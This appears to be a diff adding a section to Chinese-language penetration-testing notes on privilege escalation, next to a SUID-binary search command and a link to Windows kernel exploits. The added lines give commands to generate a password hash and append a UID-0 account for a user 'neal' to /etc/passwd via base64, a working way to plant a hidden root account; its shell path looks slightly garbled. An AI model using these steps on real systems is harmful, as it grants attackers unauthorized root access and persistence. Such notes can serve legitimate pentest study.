@@ -33,6 +33,22 @@
 
 `find / -perm -4000 2>/dev/null`
 
+#### 用户写入 passwd
+
+```
+# generate password firstly
+openssl passwd -1
+
+# then make up the passwd for user neal
+neal:passwd:0:0:neal:/root/bin.bash
+
+# write to passwd, save the above string to a file passwd
+cat passwd | base64 -w 0
+
+echo generated_base64 | base64 -d >> /etc/passwd
+```
+
+
 ### windows 提权
  * [windows 内核利用](https://github.com/51x/WHP)
 
